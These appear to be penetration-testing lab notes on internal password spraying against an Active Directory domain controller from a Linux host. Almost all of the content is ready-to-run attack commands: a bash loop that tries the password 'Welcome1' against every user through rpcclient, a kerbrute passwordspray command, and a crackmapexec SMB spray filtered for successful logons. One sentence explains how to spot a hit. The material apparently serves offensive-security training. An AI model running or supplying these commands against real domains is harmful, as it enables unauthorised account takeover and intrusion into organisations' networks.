
## **Internal Password Spraying from a Linux Host**

### **Using a Bash one-liner for the Attack**

```bash
for u in $(cat users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

This command will try to authenticate to the domain controller with each username in the users.txt file and the password `Welcome1`. If the authentication is successful (which is indicated by the keyword `Authority` in the respond), the user's username will be returned.

### **Using Kerbrute for the Attack**
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt  Welcome1
```


### **Using CrackMapExec & Filtering Logon Failures**
```bash
crackmapexec smb 172.16.5.5 -u users.txt -p Password123 | grep +
```